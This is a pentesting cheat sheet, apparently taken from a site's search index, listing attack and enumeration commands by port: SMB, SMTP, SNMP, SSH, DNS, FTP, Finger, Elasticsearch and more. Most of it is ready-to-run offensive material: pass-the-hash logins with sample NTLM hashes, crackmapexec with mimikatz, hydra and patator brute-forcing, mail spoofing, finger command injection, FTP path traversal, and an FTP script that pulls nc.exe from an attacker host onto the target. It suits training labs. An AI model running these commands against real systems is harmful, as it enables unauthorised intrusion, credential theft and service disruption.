,password = $password ,domain = $domain mount -t auto --source //192.168.31.147/kathy --target /tmp/smb/ -o username = root,workgroup = WORKGROUP mount -t cifs //10.10.10.134/backups /mnt/share -o user = ,password = net use X : \\\\ server \\ sharename / USER : domain \\ username password / PERSISTENT : YES Null Session Enumeration (enabled by default in SMB1) net use \\\\ 192 . 168 . 1 . 1 \\ ipc$ / u : net view \\\\ ip_address rpcclient -U ip ( give empty password ) srvinfo enumdomusers getdompwinfo Use UpTime to guess patch level: https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py python FindSMB2UpTime.py 172 .16.80.10 Samba Configuration Files / etc / samba / smb . conf smb . conf lmhosts Test reload configuration testparm - v service smb restart User creation: smbpasswd - a username Tools nmblookup Query NetBIOS names and map them to IP addresses in a network Using NetBIOS over TCP/IP queries nmblookup - A $ ip nbtscan Scan NetBIOS name servers open on a local or remote TCP/IP network Works on a whole subnet instead of individual IP Similar to nbtstat (Windows standard tool) nbtscan $ ip / 24 nbtstat nbtstat $ ip nbtscan - \u2010 r $ ip / 24 nbtstat -c: displays the contents of the NetBIOS name cache, the table of NetBIOS names and their resolved IP addresses. nbtstat -n: displays the names that have been registered locally on the system. nbtstat -r: displays the count of all NetBIOS names resolved by broadcast and querying a WINS server. nbtstat -R: purges and reloads the remote cache name table. nbtstat -RR: sends name release packets to WINs and then starts Refresh. nbtstat -s: lists the current NetBIOS sessions and their status, including statistics. nbtstat -S: lists sessions table with the destination IP addresses. SMBMap - enumerate samba share drives across an entire domain Allows users to enumerate samba share drives across an entire domain Usage List share drives, drive permissions, share contents Upload/download functionality File name auto-download pattern matching Execute remote commands smbmap -H $ip smbmap -d workgroup -H $ip smbmap -u -p -d workgroup -H $ip smbmap -u guest -p -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip -L #test command execution smbmap -u user -p password -d workgroup -H $ip -r #read drive smbmap -u -p -H 192 .168.1.23 # similar to crackmapexec --shares smbmap -u guest -p -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -r # list top level dir smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -R # list everything recursively smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -s wwwroot -R -A .* # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -x whoami # no work Recursively list dirs, and files: smbmap -R $sharename -H $ip Search for Groups . xml in given share: smbmap -R $shareName -H $ip -A Groups.xml -q Downloads a file in quiet mode: smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q Using hash: mbmap.py -u user123 -p aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B -H ( TARGET IP ADDRESS ) smbclient https://www.samba.org/samba/docs/current/man-html/smbclient.1.html Client that can \"talk\" to an SMB/CIFS server Operations Upload/download functionality Retrieving directory information smbclient // 192 . 168 . 1 . 23 / wwwroot smbclient // 192 . 168 . 1 . 23 / C $ WIN20082017 - U Administrator smbclient // 192 . 168 . 1 . 23 / C $ A433F6C2B0D8BB92D7288ECFFACFC7CD - U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash smbclient - L \\\\ WIN7 \\ IPC$ - I 192 . 168 . 13 . 218 smbclient \\\\ 192 . 168 . 13 . 236 \\ some - share - o user = root , pass = root , workgroup = BOB smbclient - L $ ip - U guest - p 445 smbclient - L $ ip - U $ username - p 445 password : prompt smbclient - L // server / share smbclient - L // server / share password options Null session: smbclient - N - L ( TARGET IP ) - m SMB2 Null session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - m SMB2 User session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - U ( USER ) - m SMB2 Kerberos Auth: smbclient --kerberos //ws01win10.domain.com/C$ Pass the hash: smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\\\\\(TARGET IP ADDRESS)\\\\(TARGET SHARE)\\\\ (NTLM HASH) Upload file: smbclient // 192 . 168 . 31 . 142 / ADMIN $ - U nobody % somepassword - c put 40280.py Pass-the-hash: smbclient - U testuser % nthash --pw-nt-hash -L 192.168.0.1 smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ domain - U testuser % nthash --pw-nt-hash Map drives: smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ - U root % Recursive download: https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient smbclient \\10.11.1.220\\SYSVOL - U = contoso/jane%SuperPassword^ - c prompt OFF;recurse ON;lcd . / ;mget * smb : \\ RECURSE ON smb : \\ PROMPT OFF smb : \\ mget * mask recurse ON prompt OFF cd path\\to\\remote\\dir lcd ~/path/to/download/to/ mget * rpcclient Part of the Samba suite Developed to test MS-RPC functionality in Samba Usable to open an authenticated SMB session to a target machine NULL session: rpcclient - U - N 192 . 168 . 1 . 102 User session: rpcclient - U htb \\\\ james mantis . htb . local Kerberos Auth rpcclient - k ws01win10 . domain . com Querying: rpcclient $ srvinfo # operating system version rpcclient $ enum tab tab rpcclient $ enumdomusers // Username and RID ( suffix of SID ) rpcclient $ queryuser 0 x3e8 // Info of the user for given RID rpcclient $ enumalsgroups domain // Enum aliases groups rpcclient $ enumalsgroups builtin rpcclient $ lookupnames james rpcclient $ netshareenumall # enumerate all shares and its paths rpcclient $ enumdomusers # enumerate usernames defined on the server rpcclient $ getdompwinfo # smb password policy configured on the server Change password: setuserinfo2 administrator 23 \u2018 password1234 \u2019 Lookup SID: lookupnames administrator rpcdump.py rpcdump . py username : password @IP_Address port / protocol ( i . e . 80 / HTTP ) rpcinfo rpcinfo [ options ] IP_Address Enum4linux Tool for enumerating information from Windows and Samba systems Wrapper for smbclient , rpcclient , net and nmblookup enum4linux - a $ip enum4linux - U $ip - RID cycling ( When RestrictAnonymous is set to 1 on Windows 2000 ) - User listing ( When RestrictAnonymous is set to 0 on Windows 2000 ) - Listing of group membership information - Share enumeration - Detecting if the host is in a workgroup or a domain - Identifying the remote operating system - Password policy retrieval pth-winexe pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd # using a plaintext password pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # domain user pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash + empty lm hash # or export SMBHASH = aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 pth-winexe -U Administrator% //192.168.1.23 cmd nullinux https://github.com/m8r0wn/nullinux python3 nullinux.py -users -quick DC1.Domain.net python3 nullinux.py -all 192 .168.0.0-5 python3 nullinux.py -shares -U Domain\\User -P Password1 10 .0.0.1,10.0.0.5 acccheck Password attacks acccheck - v - t $ ip - u user - P password_file mblookup NetBIOS over TCP/IP client used to lookup NetBIOS names CrackMapExec Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) -u username -H LMHASH:NTHASH crackmapexec smb target ( s ) -u username -H NTHASH crackmapexec -u guest -p --shares 192 .168.1.23 crackmapexec -u guest -p --rid-brute 4000 192 .168.1.23 crackmapexec -u guest -p --users 192 .168.1.23 crackmapexec smb 192 .168.1.0/24 -u Administrator -p P@ssw0rd crackmapexec smb 192 .168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192 .168.1.0/24 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192 .168.1.23 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192 .168.1.23 # reliable pth code execution Smbexec https://github.com/brav0hax/smbexec wmiexec https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py . / wmiexec . py - hashes ntlmhash Administrator @10.10.0.1 SuperScan Hyena Winfingerprint NetBIOS enumerator Vulnerabilities Linux CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3 When the \"username map script\" smb.conf option is enabled https://github.com/amriunix/cve-2007-2447 exploit / windows / smb / ms08_067_netapi Windows CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py https://vulners.com/exploitdb/EDB-ID:6824 exploit / windows / smb / ms08_067_netapi Hardening References NetBios https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser https://www.youtube.com/watch?v=jUc1J31DNdw t=445s Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/ Using Samba 2 nd Edition - http://www.samba.org/samba/docs/using_samba/toc.html SMTP - 25/tcp Quick Reference Connect: nc - \u2010 nv 192 . 168 . 11 . 215 25 Configuration files sendmail . cf submit . cf User enumeration with: \"VRFY\", \"EXPN\" \"RCPT\" commands: smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10 .11.1.22 VRFY username ( verifies if username exists - enumeration of accounts ) EXPN username ( verifies if username is valid - enumeration of accounts ) VRFY existing_user Results in: 250 VRFY nonexisting_user Results in: 550 for user in $( cat users.txt ) ; do echo VRFY $user | nc -nv -w ip 25 2 /dev/null | grep ^ 250 ; done Mail Spoofing: http://0daysecurity.com/penetration-testing/enumeration.html HELO anything MAIL FROM : spoofed_address RCPT TO : valid_mail_account DATA . QUIT Mail Relay HELO anything Identical to / from - mail from : nobody @ domain rcpt to : nobody @ domain Unknown domain - mail from : user @ unknown_domain Domain not present - mail from : user @ localhost Domain not supplied - mail from : user Source address omission - mail from : rcpt to : nobody @ recipient_domain Use IP address of target server - mail from : user @ IP_Address rcpt to : nobody @ recipient_domain Use double quotes - mail from : user @ domain rcpt to : user@recipent-domain User IP address of the target server - mail from : user @ domain rcpt to : nobody @ recipient_domain @[ IP Address ] Disparate formatting - mail from : user @[ IP Address ] rcpt to : @ domain : nobody @ recipient - domain Disparate formatting2 - mail from : user @[ IP Address ] rcpt to : recipient_domain ! nobody @[ IP Address ] http://0daysecurity.com/penetration-testing/enumeration.html Sending a mail HELO my . server . com MAIL FROM : RCPT TO : DATA From : Danny Dolittle To : Sarah Smith Subject : Email sample Mime - Version : 1 . 0 Content - Type : text / plain ; charset=us-ascii This is a test email for you to read . . QUIT Brute-forcing: hydra ( TARGET IP ADDRESS ) smtp - l ( USERNAME ) - P / path / to / wordlist . txt - V - s ( TARGET PORT ) Other commands Command Comment ATRN Authenticated TURN AUTH Authentication BDAT Binary data BURL Remote content DATA The actual email message to be sent. This command is terminated with a line that contains only a EHLO Extended HELO ETRN Extended turn EXPN Expand HELO Identify yourself to the SMTP server. HELP Show available commands MAIL Send mail from email account, MAIL FROM: NOOP No-op. Keeps you connection open. ONEX One message transaction only QUIT End session RCPT Send email to recipient, RCPT TO: RSET Reset SAML Send and mail SEND Send SOML Send or mail STARTTLS SUBMITTER SMTP responsible submitter TURN Turn VERB Verbose VRFY Verify Tools smtp_enum: auxiliary / scanner / smtp / smtp_enum smtp-enum-users.nse: nmap \u2013 script smtp - enum - users . nse 172 . 16 . 212 . 133 Hardening References SNMP - 161/udp Quick Reference Baed on UDP - Can be suspectable for IP spoofing and replay 1,2,2c versions are plain text Week auth and default community strings (public, default) Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered. Configuration Files snmp . conf snmpd . conf snmp - config . xml SNMP - Management Information Base (MBI) Tree database related to network management. http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm commuity strings - public / private / manager / ... Scanning nmap - sU - p 161 --open ip nmap - sU - p 161 --script=*snmp* 192.168.1.200 xprobe2 - v - p udp : 161 : open 192 . 168 . 1 . 200 auxiliary / scanner / snmp / snmp_login auxiliary / scanner / snmp / snmp_enum Default community strings public private cisco cable - docsis ILMI Important Properties: Windows NT .1.3.6.1.2.1.1.5 Hostnames .1.3.6.1.2.1.4.34.1.5.2.16 IPv6 Address .1.3.6.1.4.1.77.1.4.2 Domain Name .1.3.6.1.4.1.77.1.2.25 Usernames .1.3.6.1.4.1.77.1.2.3.1.1 Running Services .1.3.6.1.4.1.77.1.2.27 Share Information Commands: snmp - check 192 . 168 . 1 . 2 - c public snmpget - v 1 - c public IP snmpbulkwalk - v2c - c public - Cn0 - Cr10 IP Tools SNMPWalk sudo apt install --no-upgrade snmp-mibs-downloader snmpwalk - Os - c public - v 1 ip snmpwalk - c public ( TARGET IP ADDRESS ) - v1 - On snmpwalk - c public - v2c ( TARGET IP ADDRESS ) v3 doesnt have easily guessable / default community string Probe MBI snmpwalk - c public - v 1 ip 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 1 . 6 . 0 System Processes \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 Running Programs \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 4 Processes Path \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 2 . 3 . 1 . 4 Storage Units \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 6 . 3 . 1 . 2 Software Name \u2022 1 . 3 . 6 . 1 . 4 . 1 . 77 . 1 . 2 . 25 User Accounts \u2022 1 . 3 . 6 . 1 . 2 . 1 . 6 . 13 . 1 . 3 TCP Local Ports onesixtyone Scan one community string for multiple IPs onesixtyone - c community . txt - i ips . txt onesixtyone - c / pwnt / passwords / wordlists / SecLists / Discovery / SNMP / snmp . txt ( TARGET IP ADDRESS ) snmpenum: perl snmpenum . pl 192 . 168 . 38 . 200 public windows . txt OpUtils SolarWinds SNScan SNMP Scanner NS Auditor snmpcheck Hardening References SquidProxy - 3128/tcp Quick Reference Usable in pivoting: auxiliary / scanner / http / squid_pivot_scanning nikto - h http : // ( TARGET IP ADDRESS ) - useproxy http : // ( TARGET IP ADDRESS ): 3128 Tools Hardening References SSH - 22/tcp Quick Reference User Enumeration: searchsploit - m 40136 auxiliary / scanner / ssh / ssh_enumusers Configuration Files ssh_config sshd_config authorized_keys ssh_known_hosts . shosts PPK (Putty) to SSH/RSA key-file puttygen my_private_key . ppk - O private - openssh - o keyfile chmood 600 keyfile ssh - l ( USERNAME ) ( TARGET IP ADDRESS ) - i keyfile RSA key cracking ssh2john id_rsa id_rsa . john john --wordlist=/path/to/rockyou.txt id_rsa.john Tools scanssh scanssh - p - r - e excludes random ( no . ) / Network_ID / Subnet_Mask HASSH - a Profiling Method for SSH Clients and Servers: https://github.com/salesforce/hassh/ \"HASSH\" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint. Hardening SSH Auditor: https://github.com/ncsa/ssh-auditor Re-check all known hosts as new credentials are added. It will only check the new credentials. Queue a full credential scan on any new host discovered. Queue a full credential scan on any known host whose ssh version or key fingerprint changes. Attempt command execution as well as attempt to tunnel a TCP connection. Re-check each credential using a per credential scan_interval - default 14 days. References Telnet - 23/tcp Quick Reference Configuration files / etc / inetd . conf / etc / xinetd . d / telnet / etc / xinetd . d / stelnet Tools Telnet Honeypot - https://github.com/stamparm/hontel OS fingerprinting with telnet: https://securiteam.com/tools/6J00L0K06U/ Hardening References TFTP - 69/tcp Quick Reference Enumeration tftp ip_address PUT local_file tftp ip_address GET conf.txt ( or other files ) Solarwinds TFTP server tftp \u2013 i IP GET /etc/passwd ( old Solaris ) Connect TFTP tftp connect ( to ) ip tftp verbose Transfer file tftp binary tftp put example . exe / windows / system32 / example . exe Receive file tftp binary tftp get / windows / system32 / example . exe Tools Hardening References VNC - 5900/tcp Quick Reference Configuration files .vnc / etc / vnc / config $HOME / .vnc / config / etc / sysconfig / vncservers / etc / vnc.conf Registry locations \\ HKEY_CURRENT_USER \\ Software \\ ORL \\ WinVNC3 \\ HKEY_USERS \\ . DEFAULT \\ Software \\ ORL \\ WinVNC3 reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKCU \\ Software \\ TightVNC \\ Server reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Description key: 0 x238210763578887 Connect over SSH tunnel ssh -L5901:127.0.0.1:5901 charix@10.10.10.84 vncviewer 127 .0.0.1::5901 vncviewer 127 .0.0.1::5901\u200b -passwd\u200b secret Tools Hardening References WebDev Quick Reference Check Capabilities: davtest - url http : // grandpa . htb / Interact Command-line WebDAV client for Unix: http://www.webdav.org/cadaver/ Commands: https://www.systutorials.com/docs/linux/man/1-cadaver/ cadaver http : // 10 . 10 . 10 . 15 Upload file: curl --upload-file ./example.php --user user:password http:// ip /webdav_url Exploits: IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl - https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl - https://github.com/edwardz246003/IIS_exploit - https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html - https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl IIS 6.0 Tools Hardening References X11 - 6000/tcp Quick Reference Configuration files /etc/Xn.hosts /usr/lib/X11/xdm Search through all files for the command xhost + or /usr/bin/X11/xhost + /usr/lib/X11/xdm/xsession /usr/lib/X11/xdm/xsession-remote /usr/lib/X11/xdm/xsession.0 /usr/lib/X11/xdm/xdm-config DisplayManager*authorize:on Tools Hardening References","title":"Ports and protocols"},{"location":"ports-and-protocols/#template","text":"## Name - port / tcp_or_udp ** Quick Reference ** ** Tools ** ** Hardening ** ** References **","title":"Template"},{"location":"ports-and-protocols/#citrix-1494tcp","text":"Quick Reference Enumeration: ./citrix-pa-scan { IP_address/file | - | random } [ timeout ] citrix-pa-proxy.pl IP_to_proxy_to [ Local_IP ]","title":"Citrix - 1494/tcp"},{"location":"ports-and-protocols/#dhcp","text":"Quick Reference Get new IP address from DHCP: Send DHCPDISCOVER Receive DHCPOFFER dhclient","title":"DHCP"},{"location":"ports-and-protocols/#dns-53tcp","text":"Quick Reference DNS on TCP Check for zone transfers Maybe DNS Sec enabled Configuration files host . conf resolv . conf named . conf Order of name resolution: / etc / nsswitch . conf DNS sever Information: / etc / resolv . conf Forward Lookup whois whois example.com whois 50 .7.67.186 ( reverse ) Reverse Lookup write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192) append \u201c.in-addr.arpa.\u201d to it. dig 1 .1.168.192.in-addr.arpa. PTR for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -\u00ad\u2010v not found https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works Zone Transfers Copying of the zone file from a master DNS server to a slave server host -t axfr domain.name dns-server Root zone: dig axfr @dns - server Domain name: dig axfr @dns - server domain . name host - l example . com ns1 . example . com dnsrecon - d $ ip - t axfr nmap $ ip --script=dns-zone-transfer -p 53 Simple Zone Transfer Script: #/bin/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -\u00ad\u2010z $1 ] ; then echo [*] Simple Zone transfer script echo [*] Usage : $0 domain name exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $( host -\u00ad\u2010t ns $1 | cut -\u00ad\u2010d -\u00ad\u2010f4 ) ; do # For each of these servers, attempt a zone transfer host -\u00adl $1 $server | grep has address done Bruteforcing fierce - dns site . com fierce - dns site . com - dnserver ns1 . site . com dnsenum site . com \u2013 dnsserver ns1 . site . com dnsenum site . com - f / root / hostlist . txt Subdomain bruteforcing for ip in $( cat list.txt ) ; do host $ip . $website ; done for domain in $( cat /usr/share/wordlists/dnscan/subdomains-100.txt ) ; do host $domain .mydomain.com ; sleep 2 ; done | grep has | sort -u Reverse dns lookup bruteforcing for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -v not found DNS Recon Workflow (WIP) 1) Get the host's addresse (A record). 2) Get the namservers (threaded). 3) Get the MX record (threaded). 4) Perform axfr queries on nameservers and get BIND VERSION (threaded). 5) Get extra names and subdomains via google scraping (google query = \"allinurl: -www site:domain\"). 6) Brute force subdomains from file 7) Calculate C class domain network ranges and perform whois queries on them (threaded). 8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded). 9) Write to domain_ips.txt file ip-blocks. Tools Dnsrecon dnsrecon -r 127 .0.0.0/24 -n 10 .10.10.29 dnsrecon -r 127 .0.1.0/24 -n 10 .10.10.29 dnsrecon -r 10 .10.10.0/24 -n 10 .10.10.29 dnsrecon -d thinc.local -n 10 .11.1.220 -t axfr -r 10 .11.1.0/24 dnsrecon -d site.com host host -t ns example.com host -t mx example.com host www.example.com - results in IP address host nonexistent.example.com - results in not found error host -l site.com ns2.site.com host -l friendzone.red 10 .10.10.123 | grep has address | awk {print $1} nslookup nslookup ip nslookup site.com nslookup -query = mx site.com nslookup -query = ns site.com nslookup -query = any site.com set type = a google.com server ns1.google.com google.com dig # Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} # {global-d-opt} host [@local-server] {local-d-opt} # [ host [@local-server] {local-d-opt} [...]] dig google.com dig google.com mx dig @ns1.google.com google.com dig site.com dig site.com A dig +nocmd shite.com MX +noall +answer dig +nocmd site.com NS +noall +answer dig +nocmd site.com A +noall +answer dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone Transfer fierce: https://github.com/davidpepper/fierce-domain-scanner scanner that helps locate non-contiguous IP space and hostnames against specified domains. pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for General checks: fierce - dns example . com Wordlist attack: fierce - dns example . com - wordlist hosts . list recon-ng use recon / contacts / gather / http / api / whois_pocs set DOMAIN example . com run use recon / hosts / enum / http / web / xssed use recon / hosts / gather / http / web / google_site use recon / hosts / gather / http / web / ip_neighbor dnsenum dnsenum $ ip dnsrecon dnsrecon dnsrecon \u2010 d example . com \u2010 t axfr dnsenum dnsenum example . com subbrute Recursively crawls enumerated DNS records Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting knock Wordlist based subdomain bruteforcing Virustotal search Sublist3r Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS Can do \"subbrute\" scans internally Can do port scans internally Online Services https://dnsdumpster.com/ Hardening References Payload Delivery Over DNS: https://github.com/no0be/DNSlivery DNS Rebind Toolkit https://github.com/Kinimiwar/dns-rebind-toolkit Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/","title":"DNS - 53/tcp"},{"location":"ports-and-protocols/#elasticsearch-9200tcp","text":"Quick Reference Interesting APIs Description URL Config information, OS, JVM version curl - XGET http : // ip : 9200 / _nodes ? pretty = true Shutdown curl - XPOST http : // ip : 9200 / _cluster / nodes / _master / _shutdown Dump data curl http:// ip :9200/_search?size=10000 pretty=true Snapshots _snapshot Hardening elasticsearch . yml - to prevent dynamic scripting: script . disable_dynamic : true https://medium.com/@bromiley/exploiting-elasticsearch-c83825708ce1","title":"ElasticSearch - 9200/tcp"},{"location":"ports-and-protocols/#finger-79tcp","text":"Quick Reference User enumeration finger @example.com finger a b c d e f g h @example.com finger 1 2 3 4 5 6 7 8 9 0 @target_host finger admin@example.com finger user@example.com finger 0 @example.com finger .@example.com finger **@example.com finger test@example.com http://pentestmonkey.net/tools/user-enumeration/finger-user-enum finger - user - enum . pl - U seclists / Usernames / Names / names . txt - t ip https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/FINGER/finger_enum_user.sh Finger Redirect finger @target_host1@target_host2 Command execution finger |/bin/id@example.com finger |/bin/ls -a /@example.com Finger Bounce - Hop from one finger deamon to another. Request will get logged as if it arrived from a relay. finger@host.com@victim.com References Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html http://0daysecurity.com/penetration-testing/enumeration.html","title":"Finger - 79/tcp"},{"location":"ports-and-protocols/#ftp-21tcp","text":"Quick Reference Scan for anonymous FTP: nmap \u2010 v \u2010 p 21 - \u00ad\u2010 script = ftp \u2010 anon . nse 192 . 168 . 11 . 200 - 254 NSE: nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 IP Anonymous login ftp ip_address Username : anonymous Password : any @ email . com ( if prompted ) Clone: wget - r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET IP ADDRESS) Config files ftpusers ftp . conf proftpd . conf MITM pasvagg.pl: https://packetstormsecurity.com/0007-exploits/pasvagg.pl Common FTP Commands GET .. / .. / .. / boot . ini GET .. / .. / .. / .. / .. / .. / boot . ini MGET .. / .. / .. / boot . ini MGET .. / .. / .. / .. / .. / .. / boot . ini Command Description ? Request help ascii Set the mode of file transfer to ASCII (default / transmits 7bits per character) binary Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files) bye Exit the FTP environment (same as quit) cd Change directory on the remote machine close Rerminate a connection with another computer close brubeck Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. delete Delete a file in the current remote directory (same as rm in UNIX) get Copy one file from the remote machine to the local machine get ABC DEF Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. get ABC Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. help Request a list of all available FTP command lcd Change directory on your local machine (same as UNIX cd) ls List the names of the files in the current remote directory mkdir Make a new directory within the current remote directory mget Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file mget * Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. mput Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file open Open a connection with another computer open brubeck Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). put Copy one file from the local machine to the remote machine pwd Find out the pathname of the current directory on the remote machine quit Exit the FTP environment (same as bye) rmdir Remove a directory in the current remote directory Bruteforcing patator ftp_login host = 10 .11.1.220 port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = /root/oscp/lab-net2019/ftp-open.txt port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = FILE0 port = 21 user = COMBO0 password = COMBO1 0 = /root/oscp/lab-net2019/ftp-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 -x ignore:fgrep = \u2019cannot log in.\u2019 -x ignore:fgrep = \u2019Login incorrect\u2019 -l ftp_spray TCP FTP Bounce Scan: nmap \u2013 top - ports 1000 - vv - Pn - b anonymous : password @10.11.1.125 : 21 127.0.0.1 Script FTP echo open ( YOUR IP ) 21 C :\\ share \\ ftp . txt ( Writeable Directory on target ) echo USER pwnt C :\\ share \\ ftp . txt echo passwd C :\\ share \\ ftp . txt ( Password for your FTP Server ) echo bin C :\\ share \\ ftp . txt ( Sets transfer up for binary files / bytes ) echo GET nc . exe C :\\ share \\ nc . exe C :\\ share \\ ftp . txt echo bye C :\\ share \\ ftp . txt ftp - v - n - s : C : \\ share \\ ftp . txt Tools Hardening References","title":"FTP - 21/tcp"},{"location":"ports-and-protocols/#imap-134tcp-993tcp","text":"Quick Reference https://tools.ietf.org/html/rfc3501 Cheatsheet - https://busylog.net/telnet-imap-commands-note/ IMAP Capabilities Commands Extensions Connecting Port 143 (plain / no SSL) telnet IP 143 nc --crlf --verbose IP 143 Port 993 (SSL) openssl s_client - connect IP : 993 openssl s_client - connect IP : 993 - crlf - quiet Command Format Input: RandomStringID command Response: RandomStringID OK ANSWER DETAIL Login Login Method: A1 login someuser @example . com My_P @ssword1 When AUTH = PLAIN (SASL PLAIN Method) echo - en \\0someuser@example.com\\0My_P@ssword1 | openssl base64 a authenticate plain send null separated encoded username , password When AUTH = LOGIN (SASL AUTH LOGIN) echo - en someuser@example.com | openssl base64 echo - en My_P@ssword1 | base64 a AUTHENTICATE LOGIN send encoded username send encoded password SASL PLAIN as an Admin User (Masquerade another user) authcidNULauthzidNULpassword echo 